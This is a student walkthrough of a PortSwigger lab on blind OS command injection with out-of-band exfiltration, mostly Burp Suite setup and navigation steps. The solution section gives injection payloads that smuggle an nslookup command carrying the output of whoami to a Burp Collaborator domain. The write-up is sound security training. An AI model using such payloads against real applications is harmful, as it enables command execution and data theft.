# Lab 5 - Blind OS Command Injection with Out-of-Band Data Exfiltration

<h2>Lab 5: Setup</h2>

<h3>Burp Suite Startup</h3>

**Disclaimer: This lab needs Burp Suite Professional version, which I don't have so part of the lab is from video - https://www.youtube.com/watch?v=v_UVXSTkSfA**

- Open up Burp Suite by clicking on the Kali Linux icon on the left upper corner to expand the menu.
  - Type in: "Burp Suite" on the search bar.

<p align="center">
<br/>
<img src="https://i.imgur.com/GBtG9zI.png" height="90%" width="90%" alt=""/>
<br />

- Click on "OK".

<p align="center">
<br/>
<img src="https://i.imgur.com/930R9vx.png" height="60%" width="60%" alt=""/>
<br />

- Click on "I Accept".

<p align="center">
<br/>
<img src="https://i.imgur.com/sI08aew.png" height="60%" width="60%" alt=""/>
<br />

- Click on "Next".

<p align="center">
<br/>
<img src="https://i.imgur.com/mi2gE49.png" height="60%" width="60%" alt=""/>
<br />

- Click on "Start Burp".

<p align="center">
<br/>
<img src="https://i.imgur.com/u28bHJy.png" height="60%" width="60%" alt=""/>
<br />

<h2></h2>

<h3>Intercept Requests Using Burp Proxy</h3>

- Once Burp Suite finished loading, click on "Proxy".

<p align="center">
<br/>
<img src="https://i.imgur.com/TSszN7l.png" height="90%" width="90%" alt=""/>
<br />

- Click on "Open browser".

<h2></h2>

<h3>Navigate to Command Injection Labs in Portswigger On Burp Suite Browser</h3>

- Log in to [PortSwigger](https://portswigger.net/) Website.

- Click on the three line under "MY ACCOUNT" on Portswigger Website. Then, click on "Academy".

<p align="center">
<br/>
<img src="https://i.imgur.com/bx2sfy8.png" height="90%" width="90%" alt=""/>
<br />

- Click on the expand button. Then, click on "Latest topics" and "View all topics".

<p align="center">
<br/>
<img src="https://i.imgur.com/QhgwDsX.png" height="90%" width="90%" alt=""/>
<br />

- Scroll down and click on "Command Injection".

<p align="center">
<br/>
<img src="https://i.imgur.com/SjhFwI3.png" height="90%" width="90%" alt=""/>
<br />

- Scroll down and click on the lab "Blind OS command injection with out-of-band data exfiltration".

<p align="center">
<br/>
<img src="https://i.imgur.com/P6aF3Qv.png" height="90%" width="90%" alt=""/>
<br />

- Click on "ACCESS THE LAB".

<p align="center">
<br/>
<img src="https://i.imgur.com/2EVIwOv.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h2>Lab Description:</h2>

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the "whoami" command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

<h2>Lab Solution</h2>

This lab is basically Lab 4 but adding "whoami" command. So picking up from where we left off on Lab 4.

- Instead of using: "``` & nslookup zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #```"

- Add "whoami" command: " & nslookup``` `whoami` .```zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #".

  Or
  
- Add "whoami" command: " & nslookup ```$(whoami) .```zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #".

- Remember to Highlight the command and press "Ctrl + U" to encode it.

- Navigate to "Burp Collaborator client". Click on "Poll now".

<p align="center">
<br/>
<img src="https://i.imgur.com/U2xESge.png" height="90%" width="90%" alt=""/>
<br />

- The two new output display: "peter-tZXgy0". Therefore it's a success.
